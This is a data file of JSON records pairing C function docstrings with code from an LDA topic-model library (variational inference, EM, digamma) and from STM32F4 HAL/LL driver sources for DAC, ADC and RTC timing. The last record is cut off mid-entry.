{"docstring": "/*\n * variational inference\n *\n */\n", "func_signal": "double lda_inference(document* doc, lda_model* model, double* var_gamma, double** phi)", "code": "{\n    double converged = 1;\n    double phisum = 0, likelihood = 0;\n    double likelihood_old = 0, oldphi[model->num_topics];\n    int k, n, var_iter;\n    double digamma_gam[model->num_topics];\n\n    // compute posterior dirichlet\n\n    for (k = 0; k < model->num_topics; k++)\n    {\n        var_gamma[k] = model->alpha + (doc->total/((double) model->num_topics));\n        digamma_gam[k] = digamma(var_gamma[k]);\n        for (n = 0; n < doc->length; n++)\n            phi[n][k] = 1.0/model->num_topics;\n    }\n    var_iter = 0;\n\n    while ((converged > VAR_CONVERGED) &&\n           ((var_iter < VAR_MAX_ITER) || (VAR_MAX_ITER == -1)))\n    {\n\tvar_iter++;\n\tfor (n = 0; n < doc->length; n++)\n\t{\n            phisum = 0;\n            for (k = 0; k < model->num_topics; k++)\n            {\n                oldphi[k] = phi[n][k];\n                phi[n][k] =\n                    digamma_gam[k] +\n                    model->log_prob_w[k][doc->words[n]];\n\n                if (k > 0)\n                    phisum = log_sum(phisum, phi[n][k]);\n                else\n                    phisum = phi[n][k]; // note, phi is in log space\n            }\n\n            for (k = 0; k < model->num_topics; k++)\n            {\n                phi[n][k] = exp(phi[n][k] - phisum);\n                var_gamma[k] =\n                    var_gamma[k] + doc->counts[n]*(phi[n][k] - oldphi[k]);\n                // !!! a lot of extra digamma's here because of how we're computing it\n                // !!! but its more automatically updated too.\n                digamma_gam[k] = digamma(var_gamma[k]);\n            }\n        }\n\n        likelihood = compute_likelihood(doc, model, phi, var_gamma);\n        assert(!isnan(likelihood));\n        converged = (likelihood_old - likelihood) / likelihood_old;\n        likelihood_old = likelihood;\n\n        // printf(\"[LDA INF] %8.5f %1.3e\\n\", likelihood, converged);\n    }\n    return(likelihood);\n}", "path": "lda-inference.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * allocate sufficient statistics\n *\n */\n", "func_signal": "lda_suffstats* new_lda_suffstats(lda_model* model)", "code": "{\n    int num_topics = model->num_topics;\n    int num_terms = model->num_terms;\n    int i,j;\n\n    lda_suffstats* ss = malloc(sizeof(lda_suffstats));\n    ss->class_total = malloc(sizeof(double)*num_topics);\n    ss->class_word = malloc(sizeof(double*)*num_topics);\n    for (i = 0; i < num_topics; i++)\n    {\n\tss->class_total[i] = 0;\n\tss->class_word[i] = malloc(sizeof(double)*num_terms);\n\tfor (j = 0; j < num_terms; j++)\n\t{\n\t    ss->class_word[i][j] = 0;\n\t}\n    }\n    return(ss);\n}", "path": "lda-model.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * writes the word assignments line for a document to a file\n *\n */\n", "func_signal": "void write_word_assignment(FILE* f, document* doc, double** phi, lda_model* model)", "code": "{\n    int n;\n\n    fprintf(f, \"%03d\", doc->length);\n    for (n = 0; n < doc->length; n++)\n    {\n        fprintf(f, \" %04d:%02d\",\n                doc->words[n], argmax(phi[n], model->num_topics));\n    }\n    fprintf(f, \"\\n\");\n    fflush(f);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * run_em\n *\n */\n", "func_signal": "void run_em(char* start, char* directory, corpus* corpus)", "code": "{\n\n    int d, n;\n    lda_model *model = NULL;\n    double **var_gamma, **phi;\n\n    // allocate variational parameters\n\n    var_gamma = malloc(sizeof(double*)*(corpus->num_docs));\n    for (d = 0; d < corpus->num_docs; d++)\n\tvar_gamma[d] = malloc(sizeof(double) * NTOPICS);\n\n    int max_length = max_corpus_length(corpus);\n    phi = malloc(sizeof(double*)*max_length);\n    for (n = 0; n < max_length; n++)\n\tphi[n] = malloc(sizeof(double) * NTOPICS);\n\n    // initialize model\n\n    char filename[100];\n\n    lda_suffstats* ss = NULL;\n    if (strcmp(start, \"seeded\")==0)\n    {\n        model = new_lda_model(corpus->num_terms, NTOPICS);\n        ss = new_lda_suffstats(model);\n        corpus_initialize_ss(ss, model, corpus);\n        lda_mle(model, ss, 0);\n        model->alpha = INITIAL_ALPHA;\n    }\n    else if (strcmp(start, \"random\")==0)\n    {\n        model = new_lda_model(corpus->num_terms, NTOPICS);\n        ss = new_lda_suffstats(model);\n        random_initialize_ss(ss, model);\n        lda_mle(model, ss, 0);\n        model->alpha = INITIAL_ALPHA;\n    }\n    else if (strncmp(start, \"manual=\",7)==0)\n    {\n        model = new_lda_model(corpus->num_terms, NTOPICS);\n        ss = new_lda_suffstats(model);\n        manual_initialize_ss(start + 7, ss, model, corpus);\n        lda_mle(model, ss, 0);\n        model->alpha = INITIAL_ALPHA;\n    }\n    else\n    {\n        model = load_lda_model(start);\n        ss = new_lda_suffstats(model);\n    }\n\n    sprintf(filename,\"%s/000\",directory);\n    save_lda_model(model, filename);\n\n    // run expectation maximization\n\n    int i = 0;\n    double likelihood, likelihood_old = 0, converged = 1;\n    sprintf(filename, \"%s/likelihood.dat\", directory);\n    FILE* likelihood_file = fopen(filename, \"w\");\n\n    while (((converged < 0) || (converged > EM_CONVERGED) || (i <= 2)) && (i <= EM_MAX_ITER))\n    {\n        i++; printf(\"**** em iteration %d ****\\n\", i);\n        likelihood = 0;\n        zero_initialize_ss(ss, model);\n\n        // e-step\n\n        for (d = 0; d < corpus->num_docs; d++)\n        {\n            if ((d % 1000) == 0) printf(\"document %d\\n\",d);\n            likelihood += doc_e_step(&(corpus->docs[d]),\n                                     var_gamma[d],\n                                     phi,\n                                     model,\n                                     ss);\n        }\n\n        // m-step\n\n        lda_mle(model, ss, ESTIMATE_ALPHA);\n\n        // check for convergence\n\n        converged = (likelihood_old - likelihood) / (likelihood_old);\n        if (converged < 0) VAR_MAX_ITER = VAR_MAX_ITER * 2;\n        likelihood_old = likelihood;\n\n        // output model and likelihood\n\n        fprintf(likelihood_file, \"%10.10f\\t%5.5e\\n\", likelihood, converged);\n        fflush(likelihood_file);\n        if ((i % LAG) == 0)\n        {\n            sprintf(filename,\"%s/%03d\",directory, i);\n            save_lda_model(model, filename);\n            sprintf(filename,\"%s/%03d.gamma\",directory, i);\n            save_gamma(filename, var_gamma, corpus->num_docs, model->num_topics);\n        }\n    }\n\n    // output the final model\n\n    sprintf(filename,\"%s/final\",directory);\n    save_lda_model(model, filename);\n    sprintf(filename,\"%s/final.gamma\",directory);\n    save_gamma(filename, var_gamma, corpus->num_docs, model->num_topics);\n\n    // output the word assignments (for visualization)\n\n    sprintf(filename, \"%s/word-assignments.dat\", directory);\n    FILE* w_asgn_file = fopen(filename, \"w\");\n    for (d = 0; d < corpus->num_docs; d++)\n    {\n        if ((d % 100) == 0) printf(\"final e step document %d\\n\",d);\n        likelihood += lda_inference(&(corpus->docs[d]), model, var_gamma[d], phi);\n        write_word_assignment(w_asgn_file, &(corpus->docs[d]), phi, model);\n    }\n    fclose(w_asgn_file);\n    fclose(likelihood_file);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * deallocate new lda model\n *\n */\n", "func_signal": "void free_lda_model(lda_model* model)", "code": "{\n    int i;\n\n    for (i = 0; i < model->num_topics; i++)\n    {\n\tfree(model->log_prob_w[i]);\n    }\n    free(model->log_prob_w);\n}", "path": "lda-model.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * argmax\n *\n */\n", "func_signal": "int argmax(double* x, int n)", "code": "{\n    int i;\n    double max = x[0];\n    int argmax = 0;\n    for (i = 1; i < n; i++)\n    {\n        if (x[i] > max)\n        {\n            max = x[i];\n            argmax = i;\n        }\n    }\n    return(argmax);\n}", "path": "utils.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * read settings.\n *\n */\n", "func_signal": "void read_settings(char* filename)", "code": "{\n    FILE* fileptr;\n    char alpha_action[100];\n    fileptr = fopen(filename, \"r\");\n    fscanf(fileptr, \"var max iter %d\\n\", &VAR_MAX_ITER);\n    fscanf(fileptr, \"var convergence %f\\n\", &VAR_CONVERGED);\n    fscanf(fileptr, \"em max iter %d\\n\", &EM_MAX_ITER);\n    fscanf(fileptr, \"em convergence %f\\n\", &EM_CONVERGED);\n    fscanf(fileptr, \"alpha %s\", alpha_action);\n    if (strcmp(alpha_action, \"fixed\")==0)\n    {\n\tESTIMATE_ALPHA = 0;\n    }\n    else\n    {\n\tESTIMATE_ALPHA = 1;\n    }\n    fclose(fileptr);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * compute MLE lda model from sufficient statistics\n *\n */\n", "func_signal": "void lda_mle(lda_model* model, lda_suffstats* ss, int estimate_alpha)", "code": "{\n    int k; int w;\n\n    for (k = 0; k < model->num_topics; k++)\n    {\n        for (w = 0; w < model->num_terms; w++)\n        {\n            if (ss->class_word[k][w] > 0)\n            {\n                model->log_prob_w[k][w] =\n                    log(ss->class_word[k][w]) -\n                    log(ss->class_total[k]);\n            }\n            else\n                model->log_prob_w[k][w] = -100;\n        }\n    }\n    if (estimate_alpha == 1)\n    {\n        model->alpha = opt_alpha(ss->alpha_suffstats,\n                                 ss->num_docs,\n                                 model->num_topics);\n\n        printf(\"new alpha = %5.5f\\n\", model->alpha);\n    }\n}", "path": "lda-model.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * allocate new lda model\n *\n */\n", "func_signal": "lda_model* new_lda_model(int num_terms, int num_topics)", "code": "{\n    int i,j;\n    lda_model* model;\n\n    model = malloc(sizeof(lda_model));\n    model->num_topics = num_topics;\n    model->num_terms = num_terms;\n    model->alpha = 1.0;\n    model->log_prob_w = malloc(sizeof(double*)*num_topics);\n    for (i = 0; i < num_topics; i++)\n    {\n\tmodel->log_prob_w[i] = malloc(sizeof(double)*num_terms);\n\tfor (j = 0; j < num_terms; j++)\n\t    model->log_prob_w[i][j] = 0;\n    }\n    return(model);\n}", "path": "lda-model.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * save an lda model\n *\n */\n", "func_signal": "void save_lda_model(lda_model* model, char* model_root)", "code": "{\n    char filename[100];\n    FILE* fileptr;\n    int i, j;\n\n    sprintf(filename, \"%s.beta\", model_root);\n    fileptr = fopen(filename, \"w\");\n    for (i = 0; i < model->num_topics; i++)\n    {\n\tfor (j = 0; j < model->num_terms; j++)\n\t{\n\t    fprintf(fileptr, \" %5.10f\", model->log_prob_w[i][j]);\n\t}\n\tfprintf(fileptr, \"\\n\");\n    }\n    fclose(fileptr);\n\n    sprintf(filename, \"%s.other\", model_root);\n    fileptr = fopen(filename, \"w\");\n    fprintf(fileptr, \"num_topics %d\\n\", model->num_topics);\n    fprintf(fileptr, \"num_terms %d\\n\", model->num_terms);\n    fprintf(fileptr, \"alpha %5.10f\\n\", model->alpha);\n    fclose(fileptr);\n}", "path": "lda-model.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/**\n   * Proc to calculate the value of the trigamma, the second\n   * derivative of the loggamma function. Accepts positive matrices.\n   * From Abromowitz and Stegun.  Uses formulas 6.4.11 and 6.4.12 with\n   * recurrence formula 6.4.6.  Each requires workspace at least 5\n   * times the size of X.\n   *\n   **/\n", "func_signal": "double trigamma(double x)", "code": "{\n    double p;\n    int i;\n\n    x=x+6;\n    p=1/(x*x);\n    p=(((((0.075757575757576*p-0.033333333333333)*p+0.0238095238095238)\n         *p-0.033333333333333)*p+0.166666666666667)*p+1)/x+0.5*p;\n    for (i=0; i<6 ;i++)\n    {\n        x=x-1;\n        p=1/(x*x)+p;\n    }\n    return(p);\n}", "path": "utils.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * inference only\n *\n */\n", "func_signal": "void infer(char* model_root, char* save, corpus* corpus)", "code": "{\n    FILE* fileptr;\n    char filename[100];\n    int i, d, n;\n    lda_model *model;\n    double **var_gamma, likelihood, **phi;\n    document* doc;\n\n    model = load_lda_model(model_root);\n    var_gamma = malloc(sizeof(double*)*(corpus->num_docs));\n    for (i = 0; i < corpus->num_docs; i++)\n\tvar_gamma[i] = malloc(sizeof(double)*model->num_topics);\n    sprintf(filename, \"%s-lda-lhood.dat\", save);\n    fileptr = fopen(filename, \"w\");\n    for (d = 0; d < corpus->num_docs; d++)\n    {\n\tif (((d % 100) == 0) && (d>0)) printf(\"document %d\\n\",d);\n\n\tdoc = &(corpus->docs[d]);\n\tphi = (double**) malloc(sizeof(double*) * doc->length);\n\tfor (n = 0; n < doc->length; n++)\n\t    phi[n] = (double*) malloc(sizeof(double) * model->num_topics);\n\tlikelihood = lda_inference(doc, model, var_gamma[d], phi);\n\n\tfprintf(fileptr, \"%5.5f\\n\", likelihood);\n    }\n    fclose(fileptr);\n    sprintf(filename, \"%s-gamma.dat\", save);\n    save_gamma(filename, var_gamma, corpus->num_docs, model->num_topics);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * main\n *\n */\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n    // (est / inf) alpha k settings data (random / seed/ model) (directory / out)\n\n    corpus* corpus;\n\n    long t1;\n    (void) time(&t1);\n    seedMT(t1);\n    // seedMT(4357U);\n\n    if (argc > 1)\n    {\n        if (strcmp(argv[1], \"est\")==0)\n        {\n            INITIAL_ALPHA = atof(argv[2]);\n            NTOPICS = atoi(argv[3]);\n            read_settings(argv[4]);\n            corpus = read_data(argv[5]);\n            make_directory(argv[7]);\n            run_em(argv[6], argv[7], corpus);\n        }\n        if (strcmp(argv[1], \"inf\")==0)\n        {\n            read_settings(argv[2]);\n            corpus = read_data(argv[4]);\n            infer(argv[3], argv[5], corpus);\n        }\n    }\n    else\n    {\n        printf(\"usage : lda est [initial alpha] [k] [settings] [data] [random/seeded/manual=filename/*] [directory]\\n\");\n        printf(\"        lda inf [settings] [model] [data] [name]\\n\");\n    }\n    return(0);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * perform inference on a document and update sufficient statistics\n *\n */\n", "func_signal": "double doc_e_step(document* doc, double* gamma, double** phi,\n                  lda_model* model, lda_suffstats* ss)", "code": "{\n    double likelihood;\n    int n, k;\n\n    // posterior inference\n\n    likelihood = lda_inference(doc, model, gamma, phi);\n\n    // update sufficient statistics\n\n    double gamma_sum = 0;\n    for (k = 0; k < model->num_topics; k++)\n    {\n        gamma_sum += gamma[k];\n        ss->alpha_suffstats += digamma(gamma[k]);\n    }\n    ss->alpha_suffstats -= model->num_topics * digamma(gamma_sum);\n\n    for (n = 0; n < doc->length; n++)\n    {\n        for (k = 0; k < model->num_topics; k++)\n        {\n            ss->class_word[k][doc->words[n]] += doc->counts[n]*phi[n][k];\n            ss->class_total[k] += doc->counts[n]*phi[n][k];\n        }\n    }\n\n    ss->num_docs = ss->num_docs + 1;\n\n    return(likelihood);\n}", "path": "lda-estimate.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * taylor approximation of first derivative of the log gamma function\n *\n */\n", "func_signal": "double digamma(double x)", "code": "{\n    double p;\n    x=x+6;\n    p=1/(x*x);\n    p=(((0.004166666666667*p-0.003968253986254)*p+\n\t0.008333333333333)*p-0.083333333333333)*p;\n    p=p+log(x)-0.5/x-1/(x-1)-1/(x-2)-1/(x-3)-1/(x-4)-1/(x-5)-1/(x-6);\n    return p;\n}", "path": "utils.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/*\n * various intializations for the sufficient statistics\n *\n */\n", "func_signal": "void zero_initialize_ss(lda_suffstats* ss, lda_model* model)", "code": "{\n    int k, w;\n    for (k = 0; k < model->num_topics; k++)\n    {\n        ss->class_total[k] = 0;\n        for (w = 0; w < model->num_terms; w++)\n        {\n            ss->class_word[k][w] = 0;\n        }\n    }\n    ss->num_docs = 0;\n    ss->alpha_suffstats = 0;\n}", "path": "lda-model.c", "repo_name": "blei-lab/lda-c", "stars": 159, "license": "lgpl-2.1", "language": "c", "size": 5780}
{"docstring": "/**\n  * @brief  DMA half transfer complete callback. \n  * @param  hdma: pointer to a DMA_HandleTypeDef structure that contains\n  *                the configuration information for the specified DMA module.\n  * @retval None\n  */\n", "func_signal": "static void DAC_DMAHalfConvCpltCh1(DMA_HandleTypeDef *hdma)", "code": "{\n    DAC_HandleTypeDef* hdac = ( DAC_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;\n    /* Conversion complete callback */\n    HAL_DAC_ConvHalfCpltCallbackCh1(hdac); \n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Set the specified data holding register value for DAC channel.\n  * @param  hdac: pointer to a DAC_HandleTypeDef structure that contains\n  *         the configuration information for the specified DAC.\n  * @param  Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_CHANNEL_1: DAC Channel1 selected\n  *            @arg DAC_CHANNEL_2: DAC Channel2 selected  \n  * @param  Alignment: Specifies the data alignment.\n  *          This parameter can be one of the following values:\n  *            @arg DAC_ALIGN_8B_R: 8bit right data alignment selected\n  *            @arg DAC_ALIGN_12B_L: 12bit left data alignment selected\n  *            @arg DAC_ALIGN_12B_R: 12bit right data alignment selected\n  * @param  Data: Data to be loaded in the selected data holding register.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_DAC_SetValue(DAC_HandleTypeDef* hdac, uint32_t Channel, uint32_t Alignment, uint32_t Data)", "code": "{  \n  __IO uint32_t tmp = 0U;\n  \n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(Channel));\n  assert_param(IS_DAC_ALIGN(Alignment));\n  assert_param(IS_DAC_DATA(Data));\n  \n  tmp = (uint32_t)hdac->Instance; \n  if(Channel == DAC_CHANNEL_1)\n  {\n    tmp += DAC_DHR12R1_ALIGNMENT(Alignment);\n  }\n  else\n  {\n    tmp += DAC_DHR12R2_ALIGNMENT(Alignment);\n  }\n\n  /* Set the DAC channel1 selected data holding register */\n  *(__IO uint32_t *) tmp = Data;\n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Initialize some features of ADC common parameters\n  *         (all ADC instances belonging to the same ADC common instance)\n  *         and multimode (for devices with several ADC instances available).\n  * @note   The setting of ADC common parameters is conditioned to\n  *         ADC instances state:\n  *         All ADC instances belonging to the same ADC common instance\n  *         must be disabled.\n  * @param  ADCxy_COMMON ADC common instance\n  *         (can be set directly from CMSIS definition or by using helper macro @ref __LL_ADC_COMMON_INSTANCE() )\n  * @param  ADC_CommonInitStruct Pointer to a @ref LL_ADC_CommonInitTypeDef structure\n  * @retval An ErrorStatus enumeration value:\n  *          - SUCCESS: ADC common registers are initialized\n  *          - ERROR: ADC common registers are not initialized\n  */\n", "func_signal": "ErrorStatus LL_ADC_CommonInit(ADC_Common_TypeDef *ADCxy_COMMON, LL_ADC_CommonInitTypeDef *ADC_CommonInitStruct)", "code": "{\n  ErrorStatus status = SUCCESS;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_COMMON_INSTANCE(ADCxy_COMMON));\n  assert_param(IS_LL_ADC_COMMON_CLOCK(ADC_CommonInitStruct->CommonClock));\n  \n#if defined(ADC_MULTIMODE_SUPPORT)\n  assert_param(IS_LL_ADC_MULTI_MODE(ADC_CommonInitStruct->Multimode));\n  if(ADC_CommonInitStruct->Multimode != LL_ADC_MULTI_INDEPENDENT)\n  {\n    assert_param(IS_LL_ADC_MULTI_DMA_TRANSFER(ADC_CommonInitStruct->MultiDMATransfer));\n    assert_param(IS_LL_ADC_MULTI_TWOSMP_DELAY(ADC_CommonInitStruct->MultiTwoSamplingDelay));\n  }\n#endif /* ADC_MULTIMODE_SUPPORT */\n\n  /* Note: Hardware constraint (refer to description of functions             */\n  /*       \"LL_ADC_SetCommonXXX()\" and \"LL_ADC_SetMultiXXX()\"):               */\n  /*       On this STM32 serie, setting of these features is conditioned to   */\n  /*       ADC state:                                                         */\n  /*       All ADC instances of the ADC common group must be disabled.        */\n  if(__LL_ADC_IS_ENABLED_ALL_COMMON_INSTANCE(ADCxy_COMMON) == 0U)\n  {\n    /* Configuration of ADC hierarchical scope:                               */\n    /*  - common to several ADC                                               */\n    /*    (all ADC instances belonging to the same ADC common instance)       */\n    /*    - Set ADC clock (conversion clock)                                  */\n    /*  - multimode (if several ADC instances available on the                */\n    /*    selected device)                                                    */\n    /*    - Set ADC multimode configuration                                   */\n    /*    - Set ADC multimode DMA transfer                                    */\n    /*    - Set ADC multimode: delay between 2 sampling phases                */\n#if defined(ADC_MULTIMODE_SUPPORT)\n    if(ADC_CommonInitStruct->Multimode != LL_ADC_MULTI_INDEPENDENT)\n    {\n      MODIFY_REG(ADCxy_COMMON->CCR,\n                   ADC_CCR_ADCPRE\n                 | ADC_CCR_MULTI\n                 | ADC_CCR_DMA\n                 | ADC_CCR_DDS\n                 | ADC_CCR_DELAY\n                ,\n                   ADC_CommonInitStruct->CommonClock\n                 | ADC_CommonInitStruct->Multimode\n                 | ADC_CommonInitStruct->MultiDMATransfer\n                 | ADC_CommonInitStruct->MultiTwoSamplingDelay\n                );\n    }\n    else\n    {\n      MODIFY_REG(ADCxy_COMMON->CCR,\n                   ADC_CCR_ADCPRE\n                 | ADC_CCR_MULTI\n                 | ADC_CCR_DMA\n                 | ADC_CCR_DDS\n                 | ADC_CCR_DELAY\n                ,\n                   ADC_CommonInitStruct->CommonClock\n                 | LL_ADC_MULTI_INDEPENDENT\n                );\n    }\n#else\n    LL_ADC_SetCommonClock(ADCxy_COMMON, ADC_CommonInitStruct->CommonClock);\n#endif\n  }\n  else\n  {\n    /* Initialization error: One or several ADC instances belonging to        */\n    /* the same ADC common instance are not disabled.                         */\n    status = ERROR;\n  }\n  \n  return status;\n}", "path": "Software\\QFCs_ApplicationAHRS\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_ll_adc.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Set each @ref LL_ADC_InitTypeDef field to default value.\n  * @param  ADC_InitStruct Pointer to a @ref LL_ADC_InitTypeDef structure\n  *                        whose fields will be set to default values.\n  * @retval None\n  */\n", "func_signal": "void LL_ADC_StructInit(LL_ADC_InitTypeDef *ADC_InitStruct)", "code": "{\n  /* Set ADC_InitStruct fields to default values */\n  /* Set fields of ADC instance */\n  ADC_InitStruct->Resolution    = LL_ADC_RESOLUTION_12B;\n  ADC_InitStruct->DataAlignment = LL_ADC_DATA_ALIGN_RIGHT;\n  \n  /* Enable scan mode to have a generic behavior with ADC of other            */\n  /* STM32 families, without this setting available:                          */\n  /* ADC group regular sequencer and ADC group injected sequencer depend      */\n  /* only of their own configuration.                                         */\n  ADC_InitStruct->SequencersScanMode      = LL_ADC_SEQ_SCAN_ENABLE;\n  \n}", "path": "Software\\QFCs_ApplicationAHRS\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_ll_adc.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  ALARM A Event Callback in non blocking mode\n  * @note   This function is called  when RTC_ALARM interrupt took place, inside\n  * RTC_ALARM_IRQHandler(). It makes a direct call to HAL_IncTick() to increment\n  * a global variable \"uwTick\" used as application time base.\n  * @param  hrtc : RTC handle\n  * @retval None\n  */\n", "func_signal": "void HAL_RTC_AlarmAEventCallback(RTC_HandleTypeDef *hrtc)", "code": "{\n  __IO uint32_t counter = 0U;\n\n  HAL_IncTick();\n\n  __HAL_RTC_WRITEPROTECTION_DISABLE(hrtc);\n\n  /* Set the Initialization mode */\n  hrtc->Instance->ISR = (uint32_t)RTC_INIT_MASK;\n\n  while((hrtc->Instance->ISR & RTC_ISR_INITF) == (uint32_t)RESET)\n  {\n    if(counter++ == (SystemCoreClock /48U)) /* Timeout = ~ 1s */\n    {\n      break;\n    }\n  }\n\n  hrtc->Instance->DR = 0U;\n  hrtc->Instance->TR = 0U;\n\n  hrtc->Instance->ISR &= (uint32_t)~RTC_ISR_INIT;\n\n  /* Enable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_ENABLE(hrtc);\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_timebase_rtc_alarm_template.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Disables DAC and stop conversion of channel.\n  * @param  hdac: pointer to a DAC_HandleTypeDef structure that contains\n  *         the configuration information for the specified DAC.\n  * @param  Channel: The selected DAC channel. \n  *          This parameter can be one of the following values:\n  *            @arg DAC_CHANNEL_1: DAC Channel1 selected\n  *            @arg DAC_CHANNEL_2: DAC Channel2 selected  \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_DAC_Stop(DAC_HandleTypeDef* hdac, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_DAC_CHANNEL(Channel));\n  \n  /* Disable the Peripheral */\n  __HAL_DAC_DISABLE(hdac, Channel);\n \n  /* Change DAC state */\n  hdac->State = HAL_DAC_STATE_READY;\n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_dac.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Resume Tick increment.\n  * @note   Enable the tick increment by Enabling RTC ALARM interrupt.\n  * @retval None\n  */\n", "func_signal": "void HAL_ResumeTick(void)", "code": "{\n  /* Disable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_DISABLE(&hRTC_Handle);\n  /* Enable RTC ALARM Update interrupt */\n  __HAL_RTC_ALARM_ENABLE_IT(&hRTC_Handle, RTC_IT_ALRA);\n  /* Enable the write protection for RTC registers */\n  __HAL_RTC_WRITEPROTECTION_ENABLE(&hRTC_Handle);\n}", "path": "Software\\QFCs_Peripheral_UART\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_timebase_rtc_alarm_template.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief  Set each @ref LL_ADC_REG_InitTypeDef field to default value.\n  * @param  ADC_REG_InitStruct Pointer to a @ref LL_ADC_REG_InitTypeDef structure\n  *                            whose fields will be set to default values.\n  * @retval None\n  */\n", "func_signal": "void LL_ADC_REG_StructInit(LL_ADC_REG_InitTypeDef *ADC_REG_InitStruct)", "code": "{\n  /* Set ADC_REG_InitStruct fields to default values */\n  /* Set fields of ADC group regular */\n  /* Note: On this STM32 serie, ADC trigger edge is set when starting         */\n  /*       ADC conversion.                                                    */\n  /*       Refer to function @ref LL_ADC_REG_StartConversionExtTrig().        */\n  ADC_REG_InitStruct->TriggerSource    = LL_ADC_REG_TRIG_SOFTWARE;\n  ADC_REG_InitStruct->SequencerLength  = LL_ADC_REG_SEQ_SCAN_DISABLE;\n  ADC_REG_InitStruct->SequencerDiscont = LL_ADC_REG_SEQ_DISCONT_DISABLE;\n  ADC_REG_InitStruct->ContinuousMode   = LL_ADC_REG_CONV_SINGLE;\n  ADC_REG_InitStruct->DMATransfer      = LL_ADC_REG_DMA_TRANSFER_NONE;\n}", "path": "Software\\QFCs_ApplicationAHRS\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_ll_adc.c", "repo_name": "KitSprout/QCopterFlightControl", "stars": 163, "license": "other", "language": "c", "size": 24498}
{"docstring": "/**\n  * @brief This function provides minimum delay (in milliseconds) based \n  *        on variable incremented.\n  * @note In the default implementation , SysTick timer is the source of time base.\n  *       It is used to generate interrupts at regular time intervals where uwTick\n  *       is incremented.\n  * @note This function is declared as __weak to be overwritten in case of other\n  *       implementations in user file.\n  * @param Delay: specifies the delay time length, in milliseconds.\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_Delay(__IO uint32_t Delay)", "code": "{\n  uint32_t tickstart = HAL_GetTick();\n  uint32_t wait = Delay;\n  \n  /* Add a period to guarantee minimum wait */\n  if (wait < HAL_MAX_DELAY)\n  {\n     wait++;\n  }\n  \n  while((HAL_GetTick() - tickstart) < wait)\n  {\n  }\n}", "path": "Software\\QFCs_Peripheral_TIM\\Libraries\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal.c", "repo_name": "KitSprout/QCopterFlightControl", 